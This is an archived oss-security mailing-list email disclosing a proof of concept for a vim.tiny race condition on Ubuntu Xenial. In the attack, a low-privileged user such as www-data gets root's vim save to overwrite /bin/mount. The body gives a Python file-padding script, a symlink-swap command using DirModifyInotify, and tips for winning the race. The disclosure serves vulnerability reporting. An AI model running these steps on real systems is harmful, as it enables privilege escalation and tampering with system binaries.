X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["9212" "Monday" "13" "November" "2017" "15:10:25" "+0000" "Fiedler Roman" "Roman.Fiedler@ait.ac.at" "<2ECE9D9EEF1F524185270138AE23265955B10190@S0MSMAIL112.arc.local>" "174" "AW: [oss-security] Security risk of server side text editing in general and vim.tiny specifically" "^Date:" nil nil "11" "2017111315:10:25" "AW: [oss-security] Security risk of server side text editing in general and vim.tiny specifically" (number mark "        Roman.Fiedle Nov 13  174/9212  " thread-indent "\"AW: [oss-security] Security risk of server side text editing in general and vim.tiny specifically\"\n") "<20171113145336.GA23241@openwall.com>" ("<2ECE9D9EEF1F524185270138AE23265955B0B9CE@S0MSMAIL112.arc.local>" "<20171113145336.GA23241@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 11280 invoked by uid 550); 13 Nov 2017 15:12:43 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9501 invoked from network); 13 Nov 2017 15:10:38 -0000
Thread-Topic: [oss-security] Security risk of server side text editing in
 general and vim.tiny specifically
Thread-Index: AdNUkOKUbUqTfoP3SaOI50kWgowr+AH9eqAAAAKdVpA=
Message-ID: <2ECE9D9EEF1F524185270138AE23265955B10190@S0MSMAIL112.arc.local>
References: <2ECE9D9EEF1F524185270138AE23265955B0B9CE@S0MSMAIL112.arc.local>
 <20171113145336.GA23241@openwall.com>
In-Reply-To: <20171113145336.GA23241@openwall.com>
Accept-Language: en-US, de-AT
Content-Language: de-DE
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator: 
x-originating-ip: [172.30.249.121]
Content-Type: multipart/signed; micalg=2.16.840.1.101.3.4.2.1;
	protocol="application/x-pkcs7-signature";
	boundary="----=_NextPart_000_0029_01D35C99.EA4776A0"
MIME-Version: 1.0
Date: Mon, 13 Nov 2017 15:10:25 +0000
From: Fiedler Roman <Roman.Fiedler@ait.ac.at>
Reply-To: oss-security@lists.openwall.com
Subject: AW: [oss-security] Security risk of server side text editing in
 general and vim.tiny specifically
To: "'oss-security@lists.openwall.com'" <oss-security@lists.openwall.com>

------=_NextPart_000_0029_01D35C99.EA4776A0
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: 7bit

Hello Alexander,

> Von: Solar Designer [mailto:solar@openwall.com]
>
> On Fri, Nov 03, 2017 at 11:07:14AM +0000, Fiedler Roman wrote:
> > PS: POC for vim.tiny on Ubuntu Xenial to overwrite arbitrary files as user
> root when editing file in directory owned by other user is available on
> request, disclosure after one week or if list discussion indicates other 
> timing.
>
> Please post this PoC in here ASAP.  Right now, you're in violation of
> distros list policy for having posted the PoC in there yet not made it
> public on oss-security within 7 days after posting about the issue
> itself in here.  Please correct this.  (To me this is also an example of
> misuse of the distros list, and then of the ability to delay posting the
> PoC - creating administrative work for all of us out of thin air.)

Thanks for the reminder. here is the text from the original mail to your 
[vs]-list:

PS: POC for Ubuntu Xenial to overwrite /bin/mount with custom content by
creating a x.txt as another user (e.g. www-data) and having root edit it using
vim.tiny. Of course attacker would restore everything to normal afterwards
(omitted). On multicore machines, the race is not always won, for testing
purposes you can strace vim (making it slower) or add other machine load, e.g
" (cat /dev/zero | md5sum) &" as www-data. With strace, chance is nearly 100%
to replace /bin/mount with x.txt (including mode, ownership). With 24 md5sum
on a 4 core machine, chance is > 80% to make /bin/mount world writable,
otherwise also replacing the content, changing ownership.

* Create a rogue file of same size as user www-data: In real world attack,
attack would pad a file writeable by him to same size as a system library,
essential binary using spaces or newlines at the end of the file. For demo,
newlines only will do.

#!/usr/bin/python3 -BEsStt

import os

mountSize = os.stat('/bin/mount').st_size
targetFileName = 'x.txt'
targetFile = open(targetFileName, 'wb')
targetFile.write(b'\n' * mountSize)
targetFile.close()
os.chmod(targetFileName, 0o777)

* Use tool from https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=602333 to
replace with symlink. Start it as www-data after root started "vim.tiny x.txt"
but before saving file as root.

./DirModifyInotify --Watch x.txt --MovePath x.txt --LinkTarget
/bin/mount --WatchCount 0



------=_NextPart_000_0029_01D35C99.EA4776A0
Content-Type: application/pkcs7-signature; name="smime.p7s"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="smime.p7s"

MIAGCSqGSIb3DQEHAqCAMIACAQExDzANBglghkgBZQMEAgEFADCABgkqhkiG
9w0BBwEAAKCCDL0wggX9MIID5aADAgECAgkAkvp1Fx1x2IMwDQYJKoZIhvcN
AQELBQAwgawxCzAJBgNVBAYTAkFUMQ8wDQYDVQQIDAZWaWVubmExDzANBgNV
BAcMBlZpZW5uYTEyMDAGA1UECgwpQUlUIEF1c3RyaWFuIEluc3RpdHV0ZSBv
ZiBUZWNobm9sb2d5IEdtYkgxLTArBgNVBAsMJENlbnRlciBmb3IgRGlnaXRh
bCBTYWZldHkgJiBTZWN1cml0eTEYMBYGA1UEAwwPQUlUIERTUyByb290IENB
MB4XDTE3MDMwOTE1MTI1NloXDTI3MDMxMDE1MTI1NlowgawxCzAJBgNVBAYT
AkFUMQ8wDQYDVQQIDAZWaWVubmExDzANBgNVBAcMBlZpZW5uYTEyMDAGA1UE
CgwpQUlUIEF1c3RyaWFuIEluc3RpdHV0ZSBvZiBUZWNobm9sb2d5IEdtYkgx
LTArBgNVBAsMJENlbnRlciBmb3IgRGlnaXRhbCBTYWZldHkgJiBTZWN1cml0
eTEYMBYGA1UEAwwPQUlUIERTUyByb290IENBMIICIjANBgkqhkiG9w0BAQEF
AAOCAg8AMIICCgKCAgEAxGoc+0dcZdumBz9T9+kB4HCojrjmR6k8jkDwW9jn
X0tLqBuwlfWf7oTBfHRH0phPhShdTs0WRVqEGScWgnf2F8iS85aytRHRnW9r
jeJH8xOxqFsugZbmOWGhw8kM9iw6GMyPKhfKh0Z6wUS8zAu3ZMj8QA2SZzkx
iazZA8AjmfOjhkUStD5rYxEQueFSq5zgIN6sdQnTLbiLlRlSklGIgViBen8N
fy9maZnXnyQSeqv+AJvusw4tq/qPA9fwXSf/4Fo+YgzbcoRpkpZ3GA3eArb6
38l4uqLZekynVpzPO6fltw1nV0WNj02gw+NckHuHGBMTFWLzGtMx4TSvzXRd
Ry4bApphNyefO8digyBC1Wzl2mL/w97tpTLMo9RHa1DMRd4CBV2YbdRkHAhR
dsuAId2CXgFBS26OJjnccfgviqBlAKyDKR30D6DImvjFOS88IQ8uyP6Aedl+
eQd5+4rCrf4Aclk+idD46d7QkxPJvyCIhLzjeWQU+O1GWEwiy1aKkA9WLF7K
s88pJ2y7esHciEidwemSrS2ffaToa/K4VqBkmn3ppHjmj6D2gSdQstEhChPK
xToF/LCQBQc6o0vpH4eUFkHM/aKxBu9sKwZDMIMumNPyox2l/ewa526uuS5O
joPg83YDnxxDQ1XWrx4yIo+j1FtqROV4sEVFSgJZjV8CAwEAAaMgMB4wDwYD
VR0TAQH/BAUwAwEB/zALBgNVHQ8EBAMCAQYwDQYJKoZIhvcNAQELBQADggIB
AHNwDZs17W6Lg4Cxvax++h2WeTLGlnX+l1iybi5cG65rcwDrRdqPv/T7FUzy
H7c2hLLFuyGZuCXrhrPkmknVYPNOt0SQtbZuf6mSC7HVgdcEwgBRVldfY7qy
3KLMX6H2zZJF3eWWEWvctHGn1O9BD1I4vvSMD2FwSmy3hQq94/c/Wl2Tj6+Z
eONFKS4vT2wNIFesBXDJRmKLermIenV7EkiBO5qxnN5Q25+W3WEkrbuiPO5s
1KSQ1QxL88f+R9MJl8AJEXA2gzOBxKqMabJ/+NGUTt0yy7PJX0QucJ/ESwic
VQBjMKmfJxRuPkqYRpd9BQ7mp2jNzqmMiXZsdfH7NZ7UKkNevNkA13fV7k3M
D1oeZhe5MeVObzyB+hO7sb8fiNV5QSR1c3/uyAt3OEs7s1JD7vL8dmHULh5C
sVHvdr8V7Zjm4wta+7DaLBtz0mhgb9OagLZy5vS6GSKqiuf996epsTAgBFpj
JMOYYOEOlOzvnF11irl+7YMcHdOaHk+lccqwEe1oDNIjysM9aj8Uu2S9aEf6
NACA5UB4DG27yptRsXMQwOu10/lQ1Ju5H6Ed4Od5+HoTFJvVfxuelHvggce9
En1vQ9JTIm10MV1HwdkxQObweGZH4mt/HJkHKPm/X3hJCztmpOugQ50lMitC
BOk095ufDatc6TWbeie9/nFoMIIGuDCCBKCgAwIBAgIhAPyFSUbhuCR1JHvV
d3fEehZlFVSMVIrD5sezDgn+++vfMA0GCSqGSIb3DQEBCwUAMIGsMQswCQYD
VQQGEwJBVDEPMA0GA1UECAwGVmllbm5hMQ8wDQYDVQQHDAZWaWVubmExMjAw
BgNVBAoMKUFJVCBBdXN0cmlhbiBJbnN0aXR1dGUgb2YgVGVjaG5vbG9neSBH
bWJIMS0wKwYDVQQLDCRDZW50ZXIgZm9yIERpZ2l0YWwgU2FmZXR5ICYgU2Vj
dXJpdHkxGDAWBgNVBAMMD0FJVCBEU1Mgcm9vdCBDQTAeFw0xNzA2MDgwODU2
MDJaFw0yMDA2MDgwODU2MDJaMIHSMQswCQYDVQQGEwJBVDEPMA0GA1UECAwG
Vmllbm5hMQ8wDQYDVQQHDAZWaWVubmExMjAwBgNVBAoMKUFJVCBBdXN0cmlh
biBJbnN0aXR1dGUgb2YgVGVjaG5vbG9neSBHbWJIMS0wKwYDVQQLDCRDZW50
ZXIgZm9yIERpZ2l0YWwgU2FmZXR5ICYgU2VjdXJpdHkxFjAUBgNVBAMMDVJv
bWFuIEZpZWRsZXIxJjAkBgkqhkiG9w0BCQEWF3JvbWFuLmZpZWRsZXJAYWl0
LmFjLmF0MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2vuUrQTa
CeYHx0XlnnFZbwNJIAYGtwcX+WNnTOVQpRk9aAImyomxvowzTyfXZVhNjqHw
sBKN4+Xa7LA0GimyRN6v2eBelrrtJ7ziX+nvGVPlUy/EXgzY/knBX+DD2SCm
rdMao4U+M3+zk0UhZLn0LnuKKxE9rL78E+8dszLTWh3W9jMYuD3Gx91vFxC5
JfU8Bv7+4CZ/aMpG1j6ebRdyZhNb5H8O5RERPLszKNcEvc9pAeKxjMI/77kn
BT92EDxVULD9HLaD/HLWsPP2H6/ELoe/RJ8Yxh2TSICKJGUk95Ryo9qWP+9X
3zVfiVuwd00O2RX5Z4R9cVFawFRmrxC7yzHoJaHc6rpcw8ca7H9DBC5l4N4B
wW/JJpdVaIlOKa0HkMZmxZ4rAuQakuvKj7w/6UR+dnoP4Ao5p5uozOfCY8OM
8OOoh/tnI90Ubil1+niquspba1GiEPDuOzDmLb0le2LzOKf1PSckne2crUtD
L1PS9lcbFjiiZN93qYPJoqp7QY9tSxF6wyiW9FY14s+TifpEWLjECMn4d4gA
z+LWo+xG1suBelvPdSCusUFDWRGctewfi8rgOKR3Lb6HSE/1jppsMfNm1xbH
aCv/y4XvrokA7OY+XdupTvf5SDQVDmilPocTlihqi4czUC7gKsRrP8Rgf3cx
/xMGQAfoCgwpTY8CAwEAAaOBnDCBmTAMBgNVHRMBAf8EAjAAMA4GA1UdDwEB
/wQEAwIF4DAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwQwIgYDVR0R
BBswGYEXcm9tYW4uZmllZGxlckBhaXQuYWMuYXQwNgYDVR0fBC8wLTAroCmg
J4YlaHR0cDovL2Rzcy5haXQuYWMuYXQvQWl0RHNzUm9vdENhLmNybDANBgkq
hkiG9w0BAQsFAAOCAgEAlmfH6IKcvELSCvkJN73s+fBUvZsreH+VM4nv6mwO
G2otjCOimXdoJPIKAdQJMG02miEhSxcnhaCzM7D2NQcI5+Uj4kEsTNXaZ3PT
p8pClVuVhvUX3xWTRaXypBu7+EYReGXDLrzQHAUS59T1vPTjGWz/uyzZV0T0
l/h2Nu48JAgUZWqegXtS6A2L0dkyHpLg9v1DWynzSHe/TaiMvLcGhRFX25bv
QKqmQpOSDJvyDjUzIEBl7ta+pFSCcFvOeJXl9Pyx9Jz1LrKlyHb20gq6BXxR
dRl1l3h4H+Dxcm+dSh3tgMGxn649Jrr7aESqTgAWgv1JNfTXu0X1TB2ApD3d
gzvpb6S+VMpzTUPG347m0kMzQ1VsZXbnXMceAd5PGEeCw8mfBY1SCscK87cC
e4MARvGhKLsbOOn8gti2/iTEyDGTSvKRP1IStFzJdXRApz+tZu9K9vaWx/53
jV+yhtZCGIXr1XkFp/RYsWap8Ml2q06h0Tgr1fardKPTrVXPs2THDVVN9eV9
uUJHkqAxnHp8hg5zPVcc6p+Q1ZzxUyG2b4Q1FJ9jSk0upeIIDkv39mUh/q5x
j35Oe+i3B0Juw3nA3dE7TH6T+XtD8v216UF0XzEiWwtnQxyxd+GQbO+fIzr1
eyN1QUAY+d2CrAmlfr5zRBstbxx2nqx9xEXlE995gSYxggXPMIIFywIBATCB
0jCBrDELMAkGA1UEBhMCQVQxDzANBgNVBAgMBlZpZW5uYTEPMA0GA1UEBwwG
Vmllbm5hMTIwMAYDVQQKDClBSVQgQXVzdHJpYW4gSW5zdGl0dXRlIG9mIFRl
Y2hub2xvZ3kgR21iSDEtMCsGA1UECwwkQ2VudGVyIGZvciBEaWdpdGFsIFNh
ZmV0eSAmIFNlY3VyaXR5MRgwFgYDVQQDDA9BSVQgRFNTIHJvb3QgQ0ECIQD8
hUlG4bgkdSR71Xd3xHoWZRVUjFSKw+bHsw4J/vvr3zANBglghkgBZQMEAgEF
AKCCAs0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0BCQUx
DxcNMTcxMTEzMTUxMDI1WjAvBgkqhkiG9w0BCQQxIgQgXBMOTkk3t4lmI3So
KD8lFmeC6SfmJZB1TBgv/bQGI2gwgZMGCSqGSIb3DQEJDzGBhTCBgjALBglg
hkgBZQMEASowCwYJYIZIAWUDBAEWMAoGCCqGSIb3DQMHMAsGCWCGSAFlAwQB
AjAOBggqhkiG9w0DAgICAIAwDQYIKoZIhvcNAwICAUAwCwYJYIZIAWUDBAIB
MAsGCWCGSAFlAwQCAzALBglghkgBZQMEAgIwBwYFKw4DAhowgeMGCSsGAQQB
gjcQBDGB1TCB0jCBrDELMAkGA1UEBhMCQVQxDzANBgNVBAgMBlZpZW5uYTEP
MA0GA1UEBwwGVmllbm5hMTIwMAYDVQQKDClBSVQgQXVzdHJpYW4gSW5zdGl0
dXRlIG9mIFRlY2hub2xvZ3kgR21iSDEtMCsGA1UECwwkQ2VudGVyIGZvciBE
aWdpdGFsIFNhZmV0eSAmIFNlY3VyaXR5MRgwFgYDVQQDDA9BSVQgRFNTIHJv
b3QgQ0ECIQD8hUlG4bgkdSR71Xd3xHoWZRVUjFSKw+bHsw4J/vvr3zCB5QYL
KoZIhvcNAQkQAgsxgdWggdIwgawxCzAJBgNVBAYTAkFUMQ8wDQYDVQQIDAZW
aWVubmExDzANBgNVBAcMBlZpZW5uYTEyMDAGA1UECgwpQUlUIEF1c3RyaWFu
IEluc3RpdHV0ZSBvZiBUZWNobm9sb2d5IEdtYkgxLTArBgNVBAsMJENlbnRl
ciBmb3IgRGlnaXRhbCBTYWZldHkgJiBTZWN1cml0eTEYMBYGA1UEAwwPQUlU
IERTUyByb290IENBAiEA/IVJRuG4JHUke9V3d8R6FmUVVIxUisPmx7MOCf77
698wDQYJKoZIhvcNAQEBBQAEggIAS0iW3A5zBNJ1R5lWx5UdIil1DoS2oVQF
sKUoklvxZEXSAlWN2NYIlScFoRFBhfOx2Vik9Ot3mXVOdRWqyRQcYYmai3K+
rcIsdPOSuN9kD+g1XSK1lHQvGbAjHBk95syh+tAOtmXimjYsyS5xF3xaggNc
YAbQRdDmpRTNf5oBLgKYni2AcU2KTWViHYlP2+lZEFUAdH+0U+bBr7u4ZHXT
odF8uZ2rJC3C0VnX5cY0b0y4IZWPN67cjdEQFvbDjdGyET5pe2xKJnqgnY4O
LjGCUQ9u1v4gV+LqCacAtYlRql8D11nypXkZLKRYqo0Dk7xcd0mRpbsYGsQo
aX8hi+gChGSxxzS7oMyxpufGRKgSSdfZrbCOY+2oopYukdLVgEpQ6c1qBiCd
8PY3iL6eVE2fB4SBTmt+QVOpsscVC37Eefa2uAb/d0oeZ9j8GTjNynX5VWpm
wg8G50RZt5aImDWXK8j73QO8O3HAlCUleewPjKyO6JwocueXrlkYplb1x9U/
/ZdiL1uTCNc9MdCWYT+9cgaGr2Tc6MvljxZrzAeAfHp1na0ni1qypp91ZxQJ
1YJWbZDe578oAhDL3Xarbto6GmF2GxP+qx3mlKI9roLj8fz+2ZNOkqj80UbA
e1qXq+OspuZpDVnFsJp17fpn6xCEFuTMrhSf7bQQE5KpoC+1rAsAAAAAAAA=

------=_NextPart_000_0029_01D35C99.EA4776A0--
